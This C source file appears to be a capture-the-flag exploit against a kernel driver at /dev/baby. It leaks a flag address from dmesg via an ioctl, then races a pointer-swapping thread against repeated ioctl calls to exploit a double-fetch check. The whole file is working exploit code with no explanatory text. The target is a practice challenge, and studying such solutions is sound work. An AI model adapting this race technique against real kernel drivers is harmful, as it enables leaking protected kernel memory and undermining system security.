#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>

#define bp scanf("%*c")

int check_me = 0, i = 0, ret, fd;
long param[2] = {0};
long flag_addr;
char buf[0x100] = {'\x00'};

long bruteforcer()
{
	puts("[!] Bruteforcing flag_len...");
	for (i = 0 ; i < 0x100 ; i++)
	{
		memset(buf, 0x41, i);
		buf[i] = 0;
		param[1] = i;
		ret = ioctl(fd, 0x1337, param);
		if (ret == 22)
		{
			printf("[+] Found correct flag_len: %d\n", i);
			break;
		}
	}
	return i;
}

long parse_addr()
{
	int fd = open("/tmp/data", 0);
	char * ptr;
	char d[0x100] = {'\x00'};
	read(fd, d, 0x100);
	close(fd);
	system("rm /tmp/data");
	ptr = d + 0x20;
	while(*ptr != 'f')	ptr++;
	*(ptr+15) = '\x00';
	return strtol(ptr, ptr, 0x10);
}

void * speedrunner()
{
	puts("[!] speedrunner: Gotta go fast!");
	ret = 2;
	while(ret)
		param[0] = (long)flag_addr;
}

void exploit()
{
	fd = open("/dev/baby", O_RDWR);
	printf("[+] fd returns are %d\n", fd);

	// bruteforcer();
	memset(buf, 0x41, 33);
	param[0] = (long)buf;
	param[1] = 33;

	ret = ioctl(fd, 0x6666, 0);
	system("dmesg | grep flag | tail > /tmp/data");
	flag_addr = parse_addr();
	printf("[+] flag_addr: 0x%lx\n", flag_addr);

	pthread_t pid;
	puts("[!] Starting up the speedrunner...");
	pthread_create(&pid, NULL, speedrunner, NULL);

	while(ret != 2);
	puts("[!] Racing now...");
	for(i = 0; ret && (i < 10000); i++)
	{
		ret = ioctl(fd, 0x1337, param);
		param[0] = (long)buf;
	}
	pthread_kill(pid);
	close(fd);
	system("dmesg | grep flag | tail -n 1");
}

int main()
{
    exploit();
	return 0;
}
